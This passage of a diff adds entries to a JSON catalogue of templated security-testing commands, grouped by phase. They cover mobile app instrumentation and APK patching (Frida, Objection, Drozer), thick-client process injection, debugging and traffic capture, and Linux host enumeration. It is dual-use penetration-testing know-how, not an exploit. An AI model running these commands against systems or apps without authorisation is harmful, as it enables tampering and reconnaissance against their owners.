+    "command": "zipalign -v 4 {input_apk} {output_apk}"
+  },
+  {
+    "tool": "dex2jar",
+    "description": "Dex2Jar Convert",
+    "phase": "Mobile",
+    "command": "d2j-dex2jar {apk_file} -o {output_jar}"
+  },
+  {
+    "tool": "frida",
+    "description": "Frida List Processes",
+    "phase": "Mobile",
+    "command": "frida-ps -U"
+  },
+  {
+    "tool": "frida",
+    "description": "Frida Trace App",
+    "phase": "Mobile",
+    "command": "frida-trace -U -i \"{function_pattern}\" {app_name}"
+  },
+  {
+    "tool": "frida",
+    "description": "Frida Hook Script",
+    "phase": "Mobile",
+    "command": "frida -U -f {package_name} -l {script_file}"
+  },
+  {
+    "tool": "objection",
+    "description": "Objection Explore",
+    "phase": "Mobile",
+    "command": "objection -g {package_name} explore"
+  },
+  {
+    "tool": "objection",
+    "description": "Objection Patch APK",
+    "phase": "Mobile",
+    "command": "objection patchapk -s {apk_file}"
+  },
+  {
+    "tool": "keytool",
+    "description": "Keytool Print Cert",
+    "phase": "Mobile",
+    "command": "keytool -printcert -jarfile {apk_file}"
+  },
+  {
+    "tool": "drozer",
+    "description": "Drozer Connect",
+    "phase": "Mobile",
+    "command": "drozer console connect"
+  },
+  {
+    "tool": "drozer",
+    "description": "Drozer List Packages",
+    "phase": "Mobile",
+    "command": "run app.package.list"
+  },
+  {
+    "tool": "echomirage",
+    "description": "EchoMirage Inject",
+    "phase": "ThickClient",
+    "command": "EchoMirage.exe -inject {process_name}"
+  },
+  {
+    "tool": "procmon",
+    "description": "ProcMon Filter",
+    "phase": "ThickClient",
+    "command": "procmon.exe /BackingFile {output_pml} /Quiet"
+  },
+  {
+    "tool": "tcpview",
+    "description": "TCPView Map Ports",
+    "phase": "ThickClient",
+    "command": "tcpview.exe"
+  },
+  {
+    "tool": "wireshark",
+    "description": "Wireshark Capture",
+    "phase": "ThickClient",
+    "command": "wireshark -i {interface} -k -w {pcap_file}"
+  },
+  {
+    "tool": "tshark",
+    "description": "TShark Extract HTTP",
+    "phase": "ThickClient",
+    "command": "tshark -r {pcap_file} -Y http -T fields -e http.request.full_uri"
+  },
+  {
+    "tool": "dnspy",
+    "description": "DNSpy Decompile",
+    "phase": "ThickClient",
+    "command": "dnSpy.exe {dot_net_assembly}"
+  },
+  {
+    "tool": "ghidra",
+    "description": "Ghidra Headless",
+    "phase": "ThickClient",
+    "command": "analyzeHeadless {project_dir} {project_name} -import {binary_file}"
+  },
+  {
+    "tool": "radare2",
+    "description": "Radare2 Analyze",
+    "phase": "ThickClient",
+    "command": "r2 -A {binary_file}"
+  },
+  {
+    "tool": "objdump",
+    "description": "Objdump Disassemble",
+    "phase": "ThickClient",
+    "command": "objdump -d {binary_file}"
+  },
+  {
+    "tool": "gdb",
+    "description": "GDB Attach Process",
+    "phase": "ThickClient",
+    "command": "gdb -p {pid}"
+  },
+  {
+    "tool": "x64dbg",
+    "description": "x64dbg Attach",
+    "phase": "ThickClient",
+    "command": "x64dbg.exe -p {pid}"
+  },
+  {
+    "tool": "pwd",
+    "description": "Print Working Dir",
+    "phase": "Linux",
+    "command": "pwd"
+  },
+  {
+    "tool": "ls",
+    "description": "List Files Detailed",
+    "phase": "Linux",
+    "command": "ls -la"
+  },
+  {
+    "tool": "cat",
+    "description": "Concatenate File",
+    "phase": "Linux",
+    "command": "cat {file}"
+  },
+  {
+    "tool": "less",
+    "description": "View File Paged",
+    "phase": "Linux",
+    "command": "less {file}"
+  },
+  {
+    "tool": "tail",
+    "description": "Tail File Following",
+    "phase": "Linux",
+    "command": "tail -f {file}"
+  },
+  {
+    "tool": "head",
+    "description": "Head File",
+    "phase": "Linux",
+    "command": "head -n 20 {file}"
+  },
+  {
+    "tool": "history",
+    "description": "View Bash History",
+    "phase": "Linux",
+    "command": "history"
+  },
+  {
+    "tool": "env",
+    "description": "Print Environment",
+    "phase": "Linux",
+    "command": "env"
+  },
+  {
+    "tool": "id",
+    "description": "Print User ID",
+    "phase": "Linux",
+    "command": "id"
+  },
+  {
+    "tool": "whoami",
+    "description": "Print Current User",
+    "phase": "Linux",
+    "command": "whoami"
+  },
+  {
+    "tool": "w",
+    "description": "Show Logged In Users",
+    "phase": "Linux",
+    "command": "w"
+  },
+  {
+    "tool": "ps",
+    "description": "List Processes Detailed",
+    "phase": "Linux",
+    "command": "ps aux"
+  },
+  {
+    "tool": "top",
+    "description": "Live Process Monitor",
+    "phase": "Linux",
+    "command": "top"
+  },
+  {
+    "tool": "netstat",
+    "description": "Network Connections",
+    "phase": "Linux",
+    "command": "netstat -tulpn"
+  },
+  {
+    "tool": "ss",
+    "description": "Socket Statistics",
+    "phase": "Linux",
+    "command": "ss -tulpn"
+  },
+  {
+    "tool": "lsof",
+    "description": "List Open Files",
+    "phase": "Linux",
+    "command": "lsof -i :{port}"
+  },
+  {
+    "tool": "df",
+    "description": "Disk Free Space",
+    "phase": "Linux",
+    "command": "df -h"
+  },
+  {
+    "tool": "du",
+    "description": "Disk Usage",
+    "phase": "Linux",
+    "command": "du -sh {directory}"
+  },
+  {
+    "tool": "mount",
+    "description": "List Mounted Dirs",
+    "phase": "Linux",
+    "command": "mount"
+  },
+  {
+    "tool": "uname",
+    "description": "Kernel Version",
+    "phase": "Linux",
+    "command": "uname -a"
+  },
+  {
+    "tool": "cat",
+    "description": "OS Release Info",
+    "phase": "Linux",
+    "command": "cat /etc/os-release"
+  },
+  {
+    "tool": "ifconfig",
+    "description": "Network Interfaces",
+    "phase": "Linux",
+    "command": "ifconfig -a"
+  },
+  {
+    "tool": "ip",
+    "description": "IP Link Interfaces",
+    "phase": "Linux",
+    "command": "ip a"
+  },
+  {
+    "tool": "route",
+    "description": "Routing Table",
+    "phase": "Linux",
+    "command": "route -n"
+  },
+  {
+    "tool": "chmod",
+    "description": "Change File Perms",
+    "phase": "Linux",
+    "command": "chmod {permissions} {file}"
+  },
+  {
+    "tool": "chown",
+    "description": "Change File Owner",
+    "phase": "Linux",
+    "command": "chown {user}:{group} {file}"
+  }
+]
